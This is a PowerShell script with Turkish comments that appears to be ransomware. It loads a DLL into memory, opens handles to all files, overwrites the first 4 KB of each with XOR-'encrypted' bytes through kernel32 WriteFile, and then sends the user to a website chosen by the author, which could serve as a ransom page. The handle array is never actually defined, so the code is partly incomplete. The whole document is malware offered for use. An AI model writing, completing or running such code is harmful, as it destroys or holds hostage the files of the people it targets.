# Kernel32 API fonksiyonlarını import et
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    public static extern uint SetFilePointer(IntPtr hFile, int lDistanceToMove, ref int lpDistanceToMoveHigh, uint dwMoveMethod);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

# 1️⃣ Assembly modülünü memory’den load et (JIT / Dynamic Code Generation)
$dllPath = "$env:USERPROFILE\Desktop\file_read_open.dll"  # DLL’in tam yolu
$asmBytes = [System.IO.File]::ReadAllBytes($dllPath)
$asm = [System.Reflection.Assembly]::Load($asmBytes)

# 2️⃣ Assembly fonksiyonunu çağır (tüm dosya handle’larını açacak)
$openAll = $asm.GetType("Namespace.FileReader").GetMethod("OpenAllFiles")
$openAll.Invoke($null, @())

# 3️⃣ Assembly tarafından expose edilmiş handle array’i
# Örnek: $handles = Assembly tarafından global olarak expose edilmiş handle pointer array
foreach ($handle in $handles) {

    # 4️⃣ Dosya içeriğini oku
    $bufferSize = 4096
    $buffer = New-Object byte[] $bufferSize
    $bytesRead = 0

    $success = [Kernel32]::ReadFile($handle, $buffer, $bufferSize, [ref]$bytesRead, [IntPtr]::Zero)

    if ($success -and $bytesRead -gt 0) {
        # 5️⃣ XOR şifreleme (her byte ile 0xAA XOR)
        for ($i=0; $i -lt $bytesRead; $i++) {
            $buffer[$i] = $buffer[$i] -bxor 0xAA
        }

        # 6️⃣ Dosyayı başa al ve şifreli veriyi geri yaz
        [Kernel32]::SetFilePointer($handle, 0, [ref]0, 0)
        $bytesWritten = 0
        [Kernel32]::WriteFile($handle, $buffer, $bytesRead, [ref]$bytesWritten, [IntPtr]::Zero)
    }

    # 7️⃣ Handle’ı kapat
    [Kernel32]::CloseHandle($handle)
}

# 8️⃣ Kullanıcıyı web sitesine yönlendir
$websiteURL = "https://www.example.com"  # Buraya kendi siteni yaz
Start-Process $websiteURL
